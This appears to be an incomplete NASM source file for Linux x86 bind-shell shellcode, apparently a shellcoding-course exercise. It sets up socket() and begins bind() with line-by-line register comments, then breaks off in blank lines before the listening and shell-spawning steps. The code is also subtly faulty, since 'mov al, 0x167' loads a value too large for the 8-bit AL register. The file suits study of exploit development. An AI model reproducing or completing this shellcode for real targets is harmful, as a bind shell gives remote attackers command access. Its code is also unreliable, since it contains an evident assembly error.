; Filename: linux_x86_shell_bind_tcp.nasm
; Author: SLAE-14209

global _start

section .text

_start:

; syscall socket()

  xor eax, eax        ; zeroize EAX register
  xor ebx, ebx        ; zeroize EBX register
  xor ecx, ecx        ; zeroize ECX register
  xor edx, edx        ; zeroize EDX register
  
  mov al, 0x167       ; syscall socket
  mov bl, 0x02        ; AF_INET = 2
  mov cl, 0x01        ; SOCKET_STREAM = 1
  int 0x80            ; interrupt vector
  mov edi, eax        ; storing EAX into EDI for future references

; syscall bind()

  xor eax, eax        ; zeroize EAX register
  mov ax, 0x169       ; syscall bind
  mov ebx, edi        ; reference to stored eax from socket()
  









  
